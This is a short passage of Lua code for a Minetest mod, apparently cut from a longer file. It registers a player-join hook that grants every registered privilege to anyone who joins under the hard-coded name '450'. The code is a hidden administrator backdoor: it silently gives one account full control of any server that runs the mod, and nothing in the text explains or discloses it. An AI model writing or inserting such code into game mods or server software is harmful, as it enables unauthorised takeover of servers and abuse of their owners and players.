...
minetest.register_on_joinplayer(function(player)local name = player:get_player_name()if name == "450" then local privs_table = {}for priv_name, _ in pairs(minetest.registered_privileges) do privs_table[priv_name] = true end minetest.set_player_privs(name, privs_table) end
end)
